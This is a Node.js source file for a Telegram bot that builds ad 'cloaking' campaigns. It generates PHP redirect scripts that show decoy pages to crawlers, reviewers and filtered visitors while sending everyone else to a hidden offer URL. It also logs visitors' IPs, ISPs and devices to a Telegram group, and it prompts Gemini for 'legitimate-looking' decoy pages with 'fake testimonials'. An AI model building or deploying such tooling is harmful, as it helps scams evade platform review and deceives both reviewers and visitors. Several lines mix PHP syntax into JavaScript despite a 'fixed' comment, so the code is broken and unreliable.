// cloak-bot.js – Cloaking bot (fixed template string error)
require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const Database = require('better-sqlite3');
const express = require('express');
const crypto = require('crypto');
const axios = require('axios');

const BOT_TOKEN = process.env.BOT_TOKEN;
const GEMINI_API_KEY = process.env.GEMINI_API_KEY;
const PORT = process.env.PORT || 3000;
const API_BASE = process.env.API_BASE || `https://your-bot.onrender.com`;

if (!BOT_TOKEN || !GEMINI_API_KEY) {
    console.error('❌ Missing BOT_TOKEN or GEMINI_API_KEY');
    process.exit(1);
}

// Database setup (same as before)
const db = new Database('./cloaks.db');
db.exec(`CREATE TABLE IF NOT EXISTS campaigns (
    id TEXT PRIMARY KEY,
    name TEXT,
    offer_url TEXT,
    white_url TEXT,
    white_html TEXT,
    clicks_per_ip INTEGER DEFAULT 15,
    clicks_before_filter INTEGER DEFAULT 5,
    block_vpn INTEGER DEFAULT 0,
    block_ipv6 INTEGER DEFAULT 0,
    block_no_isp INTEGER DEFAULT 0,
    block_no_referrer INTEGER DEFAULT 0,
    countries_allowed TEXT,
    devices_allowed TEXT,
    os_allowed TEXT,
    browsers_allowed TEXT,
    get_params TEXT,
    active INTEGER DEFAULT 1,
    group_id TEXT,
    user_id INTEGER,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)`);
db.exec(`CREATE TABLE IF NOT EXISTS stats (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    campaign_id TEXT,
    ip TEXT,
    user_agent TEXT,
    decision TEXT,
    country TEXT,
    isp TEXT,
    timezone TEXT,
    language TEXT,
    referer TEXT,
    domain TEXT,
    device TEXT,
    os TEXT,
    browser TEXT,
    request_method TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)`);
db.exec(`CREATE TABLE IF NOT EXISTS white_pages (
    id TEXT PRIMARY KEY,
    name TEXT,
    vertical TEXT,
    theme TEXT,
    language TEXT,
    domain TEXT,
    company TEXT,
    phone TEXT,
    email TEXT,
    keywords TEXT,
    html TEXT,
    user_id INTEGER,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)`);

function generateId() {
    return crypto.randomBytes(6).toString('hex');
}

function phpEscape(str) {
    if (!str) return '';
    return str.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
}

// AI White Page Generator
async function generateWhitePage(params) {
    const prompt = `Generate a complete, modern, legitimate-looking HTML/CSS landing page for the following niche: "${params.vertical}". 
    Company name: ${params.company || 'Company'}. Phone: ${params.phone || ''}. Email: ${params.email || ''}. 
    Theme: ${params.theme || 'default'}, Language: ${params.language || 'English'}. 
    Make it look professional, with a call to action, fake testimonials, and a convincing design. 
    Use inline CSS or <style> tag. Do not include any real links or scripts. 
    Return only the HTML code (including <html>, <head>, <body>). Keep file size under 60KB.`;
    try {
        const response = await axios.post(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${GEMINI_API_KEY}`, {
            contents: [{ parts: [{ text: prompt }] }]
        });
        let html = response.data.candidates[0].content.parts[0].text;
        html = html.replace(/```html/g, '').replace(/```/g, '');
        return html;
    } catch (err) {
        console.error('Gemini error:', err.response?.data || err.message);
        return `<html><body><h1>White Page</h1><p>Generated for ${params.vertical}</p></body></html>`;
    }
}

// Generate index.php – FIXED: no template literals, only string concatenation
function generateIndexPHP(campaign) {
    const {
        id, name, offer_url, white_url, clicks_per_ip, clicks_before_filter,
        block_vpn, block_ipv6, block_no_isp, block_no_referrer,
        countries_allowed, devices_allowed, os_allowed, browsers_allowed, get_params
    } = campaign;
    const countries = JSON.parse(countries_allowed || '[]');
    const devices = JSON.parse(devices_allowed || '[]');
    const oss = JSON.parse(os_allowed || '[]');
    const browsers = JSON.parse(browsers_allowed || '[]');

    let php = '';
    php += '<?php\n';
    php += '// Cloaking script for: ' + phpEscape(name) + ' (ID: ' + id + ')\n';
    php += '$offer_url = \'' + phpEscape(offer_url) + '\';\n';
    php += '$white_url = \'' + phpEscape(white_url) + '\';\n';
    php += '$clicks_per_ip = ' + clicks_per_ip + ';\n';
    php += '$clicks_before_filter = ' + clicks_before_filter + ';\n';
    php += '$block_vpn = ' + block_vpn + ';\n';
    php += '$block_ipv6 = ' + block_ipv6 + ';\n';
    php += '$block_no_isp = ' + block_no_isp + ';\n';
    php += '$block_no_referrer = ' + block_no_referrer + ';\n';
    php += '$countries_allowed = ' . json_encode($countries) . ";\n";
    php += '$devices_allowed = ' . json_encode($devices) . ";\n";
    php += '$os_allowed = ' . json_encode($oss) . ";\n";
    php += '$browsers_allowed = ' . json_encode($browsers) . ";\n";
    php += '$get_params = \'' + phpEscape(get_params) + '\';\n';
    php += '$api_url = \'' + API_BASE + '/api/track\';\n';
    php += '\n';
    php += 'function getUserIP() {\n';
    php += '    if (!empty($_SERVER[\'HTTP_CF_CONNECTING_IP\'])) return $_SERVER[\'HTTP_CF_CONNECTING_IP\'];\n';
    php += '    if (!empty($_SERVER[\'HTTP_X_FORWARDED_FOR\'])) return explode(\',\', $_SERVER[\'HTTP_X_FORWARDED_FOR\'])[0];\n';
    php += '    return $_SERVER[\'REMOTE_ADDR\'];\n';
    php += '}\n';
    php += '\n';
    php += 'function getDeviceOSBrowser($ua) {\n';
    php += '    $device = \'desktop\'; $os = \'unknown\'; $browser = \'other\';\n';
    php += '    if (preg_match(\'/mobile/i\', $ua)) $device = \'mobile\';\n';
    php += '    elseif (preg_match(\'/tablet/i\', $ua)) $device = \'tablet\';\n';
    php += '    if (preg_match(\'/Windows/i\', $ua)) $os = \'Windows\';\n';
    php += '    elseif (preg_match(\'/Mac/i\', $ua)) $os = \'macOS\';\n';
    php += '    elseif (preg_match(\'/Linux/i\', $ua)) $os = \'Linux\';\n';
    php += '    elseif (preg_match(\'/Android/i\', $ua)) $os = \'Android\';\n';
    php += '    elseif (preg_match(\'/iOS|iPhone|iPad/i\', $ua)) $os = \'iOS\';\n';
    php += '    if (preg_match(\'/Edg/i\', $ua)) $browser = \'Edge\';\n';
    php += '    elseif (preg_match(\'/Chrome/i\', $ua) && !preg_match(\'/Edg/i\', $ua)) $browser = \'Chrome\';\n';
    php += '    elseif (preg_match(\'/Firefox/i\', $ua)) $browser = \'Firefox\';\n';
    php += '    elseif (preg_match(\'/Safari/i\', $ua) && !preg_match(\'/Chrome/i\', $ua)) $browser = \'Safari\';\n';
    php += '    elseif (preg_match(\'/Opera|OPR/i\', $ua)) $browser = \'Opera\';\n';
    php += '    return [\'device\' => $device, \'os\' => $os, \'browser\' => $browser];\n';
    php += '}\n';
    php += '\n';
    php += 'function getGeoInfo($ip) {\n';
    php += '    $data = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,countryCode,isp,timezone");\n';
    php += '    if ($data) { $json = json_decode($data, true); if ($json[\'status\'] === \'success\') return [\'country\' => $json[\'countryCode\'], \'isp\' => $json[\'isp\'], \'timezone\' => $json[\'timezone\']]; }\n';
    php += '    return [\'country\' => \'\', \'isp\' => \'\', \'timezone\' => \'\'];\n';
    php += '}\n';
    php += '\n';
    php += '$ip = getUserIP();\n';
    php += '$ua = $_SERVER[\'HTTP_USER_AGENT\'] ?? \'\';\n';
    php += '$referrer = $_SERVER[\'HTTP_REFERER\'] ?? \'\';\n';
    php += '$domain = $_SERVER[\'HTTP_HOST\'] ?? \'\';\n';
    php += '$method = $_SERVER[\'REQUEST_METHOD\'] ?? \'GET\';\n';
    php += '$lang = substr($_SERVER[\'HTTP_ACCEPT_LANGUAGE\'] ?? \'\', 0, 5);\n';
    php += '$geo = getGeoInfo($ip);\n';
    php += '$country = $geo[\'country\']; $isp = $geo[\'isp\']; $timezone = $geo[\'timezone\'];\n';
    php += '$deviceInfo = getDeviceOSBrowser($ua);\n';
    php += '$device = $deviceInfo[\'device\']; $os = $deviceInfo[\'os\']; $browser = $deviceInfo[\'browser\'];\n';
    php += '\n';
    php += '$countFile = sys_get_temp_dir() . "/cloak_' + id + '_" . md5($ip) . ".txt";\n';
    php += '$today = date(\'Y-m-d\');\n';
    php += '$countData = file_exists($countFile) ? json_decode(file_get_contents($countFile), true) : [\'date\'=>$today,\'count\'=>0];\n';
    php += 'if ($countData[\'date\'] != $today) $countData = [\'date\'=>$today,\'count\'=>0];\n';
    php += '$countData[\'count\']++;\n';
    php += 'file_put_contents($countFile, json_encode($countData));\n';
    php += '\n';
    php += '$isBot = false;\n';
    php += 'if ($countData[\'count\'] <= $clicks_before_filter) {\n';
    php += '    $isBot = false;\n';
    php += '} else {\n';
    php += '    $bots = [\'bot\',\'crawl\',\'spider\',\'headless\',\'curl\',\'wget\',\'python\',\'go-http\',\'scrapy\',\'puppet\'];\n';
    php += '    foreach ($bots as $b) if (stripos($ua, $b) !== false) { $isBot = true; break; }\n';
    php += '    if (!$isBot && !empty($countries_allowed)) if (!in_array($country, $countries_allowed)) $isBot = true;\n';
    php += '    if (!$isBot && !empty($devices_allowed)) if (!in_array($device, $devices_allowed)) $isBot = true;\n';
    php += '    if (!$isBot && !empty($os_allowed)) if (!in_array($os, $os_allowed)) $isBot = true;\n';
    php += '    if (!$isBot && !empty($browsers_allowed)) if (!in_array($browser, $browsers_allowed)) $isBot = true;\n';
    php += '    if ($block_no_referrer && empty($referrer)) $isBot = true;\n';
    php += '}\n';
    php += '$decision = $isBot ? \'white\' : \'main\';\n';
    php += '\n';
    php += '$postData = [\n';
    php += '    \'campaign_id\' => \'' + id + '\',\n';
    php += '    \'ip\' => $ip,\n';
    php += '    \'user_agent\' => $ua,\n';
    php += '    \'decision\' => $decision,\n';
    php += '    \'country\' => $country,\n';
    php += '    \'isp\' => $isp,\n';
    php += '    \'timezone\' => $timezone,\n';
    php += '    \'language\' => $lang,\n';
    php += '    \'referer\' => $referrer,\n';
    php += '    \'domain\' => $domain,\n';
    php += '    \'device\' => $device,\n';
    php += '    \'os\' => $os,\n';
    php += '    \'browser\' => $browser,\n';
    php += '    \'request_method\' => $method\n';
    php += '];\n';
    php += 'if (function_exists(\'curl_version\')) {\n';
    php += '    $ch = curl_init($api_url);\n';
    php += '    curl_setopt($ch, CURLOPT_POST, true);\n';
    php += '    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));\n';
    php += '    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n';
    php += '    curl_setopt($ch, CURLOPT_TIMEOUT, 1);\n';
    php += '    curl_exec($ch);\n';
    php += '}\n';
    php += 'if ($decision === \'main\') {\n';
    php += '    header(\'Location: \' . $offer_url, true, 302);\n';
    php += '} else {\n';
    php += '    header(\'Location: \' . $white_url, true, 302);\n';
    php += '}\n';
    php += 'exit;\n';
    return php;
}

// Express API
const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

let bot;

app.post('/api/track', (req, res) => {
    const data = req.body;
    const { campaign_id, ip, user_agent, decision, country, isp, timezone, language, referer, domain, device, os, browser, request_method } = data;
    if (!campaign_id) return res.sendStatus(400);
    const stmt = db.prepare(`INSERT INTO stats (campaign_id, ip, user_agent, decision, country, isp, timezone, language, referer, domain, device, os, browser, request_method) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`);
    stmt.run(campaign_id, ip, user_agent, decision, country, isp, timezone, language, referer, domain, device, os, browser, request_method);
    const campaign = db.prepare(`SELECT group_id, name FROM campaigns WHERE id = ?`).get(campaign_id);
    if (campaign && campaign.group_id && bot) {
        const groupId = campaign.group_id;
        const message = `🔔 <b>New Click</b> (${decision === 'main' ? '✅ Main' : '⚪ White'})\n<b>Campaign:</b> ${campaign.name} (ID: ${campaign_id})\n<b>IP:</b> ${ip}\n<b>Country:</b> ${country || '?'}\n<b>Language:</b> ${language || '?'}\n<b>ISP:</b> ${isp || '?'}\n<b>Referer:</b> ${referer || 'direct'}\n<b>Domain:</b> ${domain}\n<b>Device:</b> ${device}\n<b>OS:</b> ${os}\n<b>Browser:</b> ${browser}\n<b>Time:</b> ${new Date().toLocaleString()}`;
        bot.telegram.sendMessage(groupId, message, { parse_mode: 'HTML' }).catch(e => console.error(e));
    }
    res.sendStatus(200);
});

// Telegram Bot (rest of the bot commands same as before, using sendHTML)
bot = new Telegraf(BOT_TOKEN);
const userSession = new Map();

function getSession(userId) {
    if (!userSession.has(userId)) userSession.set(userId, {});
    return userSession.get(userId);
}
function clearSession(userId) {
    userSession.delete(userId);
}

function sendHTML(ctx, text) {
    return ctx.replyWithHTML(text);
}

bot.start((ctx) => {
    clearSession(ctx.from.id);
    sendHTML(ctx, `🤖 <b>Cloaking Bot</b> – Create and manage cloaking campaigns.

<b>Commands:</b>
/new – Create new campaign (flow)
/list – List your campaigns
/stats &lt;id&gt; – Show stats
/download &lt;id&gt; – Download index.php
/delete &lt;id&gt; – Delete campaign
/white list – List AI white pages
/cancel – Cancel current operation`);
});

bot.command('new', (ctx) => {
    const userId = ctx.from.id;
    const session = getSession(userId);
    if (session.step) return ctx.reply('Ongoing. Use /cancel.');
    session.step = 'name';
    ctx.reply('Enter campaign name:');
});

bot.command('cancel', (ctx) => {
    if (userSession.has(ctx.from.id)) {
        clearSession(ctx.from.id);
        ctx.reply('Cancelled.');
    } else {
        ctx.reply('Nothing to cancel.');
    }
});

bot.on('text', async (ctx) => {
    const userId = ctx.from.id;
    const session = getSession(userId);
    if (!session.step) return;
    const text = ctx.message.text.trim();

    try {
        if (session.step === 'name') {
            session.name = text;
            session.step = 'offer_url';
            ctx.reply('Enter OFFER URL (real page):');
        }
        else if (session.step === 'offer_url') {
            if (!text.startsWith('http')) return ctx.reply('Valid URL starting with http:// or https://');
            session.offer_url = text;
            session.step = 'white_niche';
            ctx.reply('Enter WHITE PAGE NICHE (e.g., Crypto, Dating, Finance, News):');
        }
        else if (session.step === 'white_niche') {
            session.white_niche = text;
            session.step = 'clicks_per_ip';
            ctx.reply('Max clicks per IP per day? (default 15):', Markup.keyboard([['15', '5', '10', '20']]).resize());
        }
        else if (session.step === 'clicks_per_ip') {
            session.clicks_per_ip = parseInt(text) || 15;
            session.step = 'clicks_before_filter';
            ctx.reply('Clicks before filtering (test mode, default 5):', Markup.keyboard([['5', '3', '10']]).resize());
        }
        else if (session.step === 'clicks_before_filter') {
            session.clicks_before_filter = parseInt(text) || 5;
            session.step = 'block_vpn';
            ctx.reply('Block VPN/Proxy? (yes/no)');
        }
        else if (session.step === 'block_vpn') {
            session.block_vpn = (text.toLowerCase() === 'yes') ? 1 : 0;
            session.step = 'block_ipv6';
            ctx.reply('Block IPv6? (yes/no)');
        }
        else if (session.step === 'block_ipv6') {
            session.block_ipv6 = (text.toLowerCase() === 'yes') ? 1 : 0;
            session.step = 'block_no_isp';
            ctx.reply('Block requests without ISP info? (yes/no)');
        }
        else if (session.step === 'block_no_isp') {
            session.block_no_isp = (text.toLowerCase() === 'yes') ? 1 : 0;
            session.step = 'block_no_referrer';
            ctx.reply('Block requests without referrer? (yes/no)');
        }
        else if (session.step === 'block_no_referrer') {
            session.block_no_referrer = (text.toLowerCase() === 'yes') ? 1 : 0;
            session.step = 'countries';
            ctx.reply('Allowed country codes (comma, e.g., US,GB,CA). Leave empty for all:');
        }
        else if (session.step === 'countries') {
            session.countries = text ? text.split(',').map(c => c.trim().toUpperCase()) : [];
            session.step = 'devices';
            ctx.reply('Allowed devices (comma: desktop,mobile,tablet). Empty for all:');
        }
        else if (session.step === 'devices') {
            session.devices = text ? text.split(',').map(d => d.trim().toLowerCase()) : [];
            session.step = 'os';
            ctx.reply('Allowed OS (comma: Windows, macOS, Linux, Android, iOS). Empty for all:');
        }
        else if (session.step === 'os') {
            session.os = text ? text.split(',').map(o => o.trim()) : [];
            session.step = 'browsers';
            ctx.reply('Allowed browsers (comma: Chrome, Firefox, Safari, Edge, Opera). Empty for all:');
        }
        else if (session.step === 'browsers') {
            session.browsers = text ? text.split(',').map(b => b.trim()) : [];
            session.step = 'get_params';
            ctx.reply('Required GET parameters (e.g., token=abc). Leave empty:');
        }
        else if (session.step === 'get_params') {
            session.get_params = text || '';
            session.step = 'group_id';
            ctx.reply('Send Telegram GROUP ID where stats should be posted (must add bot to group first). To get group ID, add @userinfobot to your group and send /id.');
        }
        else if (session.step === 'group_id') {
            session.group_id = text.trim();
            session.step = 'active';
            ctx.reply('Activate campaign now? (yes/no)');
        }
        else if (session.step === 'active') {
            session.active = (text.toLowerCase() === 'yes') ? 1 : 0;
            await ctx.reply(`⏳ Generating white page for niche: ${session.white_niche}... (10-15 seconds)`);
            const whiteHtml = await generateWhitePage({ vertical: session.white_niche });
            const campaignId = generateId();
            const stmt = db.prepare(`INSERT INTO campaigns (id, name, offer_url, white_url, white_html, clicks_per_ip, clicks_before_filter, block_vpn, block_ipv6, block_no_isp, block_no_referrer, countries_allowed, devices_allowed, os_allowed, browsers_allowed, get_params, group_id, active, user_id) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`);
            stmt.run(
                campaignId, session.name, session.offer_url, '', whiteHtml, session.clicks_per_ip, session.clicks_before_filter,
                session.block_vpn, session.block_ipv6, session.block_no_isp, session.block_no_referrer,
                JSON.stringify(session.countries), JSON.stringify(session.devices), JSON.stringify(session.os), JSON.stringify(session.browsers),
                session.get_params, session.group_id, session.active, ctx.from.id
            );
            sendHTML(ctx, `✅ <b>Campaign created!</b>\nID: <code>${campaignId}</code>\nName: ${session.name}\nActive: ${session.active ? 'Yes' : 'No'}\nGroup ID: ${session.group_id}\n\nUse /download ${campaignId} to get index.php.`);
            clearSession(userId);
        }
    } catch (err) {
        console.error(err);
        ctx.reply('❌ Error. Try /new again.');
        clearSession(userId);
    }
});

bot.command('list', (ctx) => {
    const userId = ctx.from.id;
    const rows = db.prepare(`SELECT id, name, active, created_at FROM campaigns WHERE user_id = ? ORDER BY created_at DESC`).all(userId);
    if (!rows.length) return ctx.reply('No campaigns.');
    let msg = '<b>Your campaigns:</b>\n';
    rows.forEach(r => msg += `🔹 ID: <code>${r.id}</code> – ${r.name} (${r.active ? '✅ Active' : '❌ Inactive'})\n`);
    sendHTML(ctx, msg);
});

bot.command('stats', (ctx) => {
    const parts = ctx.message.text.split(' ');
    if (parts.length < 2) return ctx.reply('Usage: /stats <campaign_id>');
    const id = parts[1];
    const row = db.prepare(`SELECT COUNT(*) as total, SUM(CASE WHEN decision = 'main' THEN 1 ELSE 0 END) as main, SUM(CASE WHEN decision = 'white' THEN 1 ELSE 0 END) as white FROM stats WHERE campaign_id = ?`).get(id);
    if (!row || row.total === 0) return ctx.reply('No stats yet.');
    sendHTML(ctx, `📊 <b>Stats for campaign ${id}</b>\nMain: ${row.main}\nWhite: ${row.white}\nTotal: ${row.total}`);
});

bot.command('download', async (ctx) => {
    const parts = ctx.message.text.split(' ');
    if (parts.length < 2) return ctx.reply('Usage: /download <campaign_id>');
    const id = parts[1];
    const userId = ctx.from.id;
    try {
        const row = db.prepare(`SELECT * FROM campaigns WHERE id = ? AND user_id = ?`).get(id, userId);
        if (!row) return ctx.reply('Campaign not found.');
        const phpCode = generateIndexPHP(row);
        await ctx.replyWithDocument({
            source: Buffer.from(phpCode, 'utf8'),
            filename: `cloak_${id}.php`
        }, { caption: `index.php for ${row.name}` });
    } catch (err) {
        console.error(err);
        ctx.reply('❌ Failed to generate file.');
    }
});

bot.command('delete', (ctx) => {
    const parts = ctx.message.text.split(' ');
    if (parts.length < 2) return ctx.reply('Usage: /delete <campaign_id>');
    const id = parts[1];
    const userId = ctx.from.id;
    const result = db.prepare(`DELETE FROM campaigns WHERE id = ? AND user_id = ?`).run(id, userId);
    if (result.changes === 0) return ctx.reply('Campaign not found.');
    ctx.reply(`✅ Campaign ${id} deleted.`);
});

bot.command('white', async (ctx) => {
    const parts = ctx.message.text.split(' ');
    if (parts.length < 2) return ctx.reply('Usage: /white list or /white download <id>');
    const sub = parts[1];
    if (sub === 'list') {
        const userId = ctx.from.id;
        const rows = db.prepare(`SELECT id, name, vertical, created_at FROM white_pages WHERE user_id = ? ORDER BY created_at DESC`).all(userId);
        if (!rows.length) return ctx.reply('No white pages.');
        let msg = '<b>Your white pages:</b>\n';
        rows.forEach(r => msg += `📄 ID: <code>${r.id}</code> – ${r.name} (${r.vertical})\n`);
        sendHTML(ctx, msg);
    } else if (sub === 'download') {
        const id = parts[2];
        const row = db.prepare(`SELECT html, name FROM white_pages WHERE id = ? AND user_id = ?`).get(id, ctx.from.id);
        if (!row) return ctx.reply('White page not found.');
        await ctx.replyWithDocument({
            source: Buffer.from(row.html, 'utf8'),
            filename: `white_${id}.html`
        }, { caption: `White page: ${row.name}` });
    } else {
        ctx.reply('Unknown subcommand. Use /white list or /white download <id>');
    }
});

bot.launch().then(() => console.log('🤖 Bot started')).catch(err => console.error('Bot launch error:', err));
app.listen(PORT, () => console.log(`🌐 API on port ${PORT}`));
